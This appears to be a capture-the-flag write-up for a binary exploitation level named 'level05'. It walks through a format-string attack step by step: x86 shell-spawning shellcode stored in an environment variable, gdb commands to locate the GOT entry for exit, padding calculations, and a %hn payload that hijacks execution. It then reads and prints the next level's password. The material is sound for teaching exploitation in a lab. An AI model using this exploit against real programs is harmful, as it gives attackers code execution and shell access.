Program behavior:
1. Reads from stdin to a buffer using `fgets` function;
2. Converts each upper case letter to lower case;
3. Calls `printf` with a buffer as a single argument.
4. Terminates by calling `exit` function.

Solution:
Call a shellcode by overwriting the GOT address of `exit` function with the address of enviroment variable.

# Store a shellcode inside the enviroment variable
export SHELLCODE=`python -c 'print "\x90" * 42 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
# Launch the debugger
gdb level05
# Check the GOT address of exit function
x/i exit
`0x8048370 <exit@plt>:        jmp    *0x80497e0`
# Run the debugged program
start
# Check the SHELLCODE address
x/s *environ
`0xffffd8a9:      "SHELLCODE=(...)`
# Add some bytes to hit a NOP sled
print/a *environ + 15
`$1 = 0xffffd8b8`
# Split the address in a half (since it too big for an integer)
`0xffffd8b8 -> 0xffff and 0xd8b8`
# Calculate padding
print/d 0xd8b8 - 0x4 - 0x4
`$2 = 55472`
print/d 0xffff - 0xd8b8
`$3 = 10055`
# Quit the debugger
quit
# Get the buffer offset
python -c 'print("B" * 4 + " %p" * 10)' | ./level05
`bbbb 0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd6e4 0xf7fdb000 0x62626262`
# Initiate format string attack
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55472d%10$hn" + "%10055d%11$hn")'; cat) | ./level05
# Check the flag
cat /home/users/level06/.pass
`h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
